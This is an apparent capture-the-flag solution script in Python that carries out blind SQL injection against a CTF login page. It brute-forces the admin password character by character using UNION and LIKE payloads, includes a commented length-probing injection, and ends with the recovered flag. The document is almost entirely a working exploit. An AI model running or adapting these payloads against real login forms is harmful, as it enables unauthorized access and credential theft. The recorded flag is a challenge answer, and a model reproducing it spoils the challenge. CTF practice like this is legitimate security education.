import requests

SERVER = "http://stuyctf.me/php/SQLi/login.php"
UNION = "\' UNION SELECT * from users where username = \"admin\" AND password LIKE \""
ALL = "%\" -- " # Basically *, anything can take place of %

def connect(username , password , flag , letter):
    URL = SERVER + "?username=" + username + "&password=" + password
    URL = URL.replace(" " , "%20") # Replace spaces with url encoded equivalent
    response = requests.get(URL).text
    if "Logged in!" in response:
        flag += letter
    return flag

# Acquired password length by playing around with
# admin' AND CHAR_LENGTH(password)>43 -- &password=

letters = "abcdefhgijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
# Crack all possible passwords with given characters
def crack():
    flag = ""
    for i in range(0 , 44): # Playing around a bit revealed that the password length is 44
        for letter in letters:
            flagAlt = flag
            flag = connect(UNION + flag + letter + ALL , "" , flag , letter)
            if (flagAlt != flag): # Detect a change in the flag
                print flag
                break
    print flag

crack()

# stuyctf{passwords_shouldnt_be_flags_in_ctfs}
